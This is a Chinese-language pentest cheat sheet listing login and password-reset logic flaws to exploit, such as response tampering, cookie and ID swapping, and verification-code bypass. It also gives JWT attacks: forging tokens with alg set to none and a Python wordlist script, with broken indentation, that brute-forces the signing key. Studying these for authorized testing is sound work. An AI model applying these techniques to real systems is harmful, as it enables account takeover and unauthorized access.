### 一些存在问题的逻辑
	任意用户注册
	可爆破用户名
	爆破用户名，密码
	用户名注入
	万能密码
	用户名Xss
	修改返回包信息，登入他人账户
	修改cookie中的参数，如user,adminid等
	HTML源码、JS等查看信息搜集一章
	后台登录参数修改为注册参数/reg、/register、/sign等
	密码重置
    	1．重置一个账户，不发送验证码，设置验证码为空发送请求。
    	2．发送验证码，查看相应包
	3．验证码生存期的爆破
    	4．修改相应包为成功的相应包
    	5．手工直接跳转到校验成功的界面
    	6．两个账户，重置别人密码时，替换验证码为自己正确的验证码
    	7．重置别人密码时，替换为自己的手机号
    	8．重置自己的成功时，同意浏览器重置别人的，不发验证码
    	9．替换用户名，ID，cookie，token参数等验证身份的参数
    	10．通过越权修改他人的找回信息如手机/邮箱来重置 
### JWT攻击手法
  	https://jwt.io/#debugger-io
  #### 未校验签名
  	将原JWT串解码后修改用户名等身份认证的地方，生成新token发送请求
  #### 禁用哈希
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/1.png)<br>

	Alg代表加密方式，修改用户名等身份认证的地方，把HS256设置为none生成token发送请求，使用python的pyjwt模块
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/2.png)<br>

jwt.encode({'user':'admin','arg1':'value1','arg2':'value2'},algorithm='none',key='')
  #### 爆破弱密钥
    >pip3 install pyjwt
    >python3 crack.py
```python
    import jwt
    import termcolor

    jwt_str = R'token'
    with open('/root/password.txt') as f:
      for line in f:
      key_ = line.strip()
      try:
        jwt.decode(jwt_str,verify=True,key=key_)
        print('\r','\bfound key -->',termcolor.colored(key_,'green'),'<--')
        break
      except(jwt.exceptions.ExpiredSignatureError,jwt.exceptions.InvalidAudienceError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.InvalidIssuedAtError,jwt.exceptions.ImmatureSignatureError):
        print('\r','\bfound key -->',termcolor.colored(key_,'green'),'<--')
      except jwt.exceptions.InvalidSignatureError:
        print('\r',' ' * 64, '\r\btry',key_,end='',flush=True)
        continue
    else:
      print('\r','\bnot found.')
```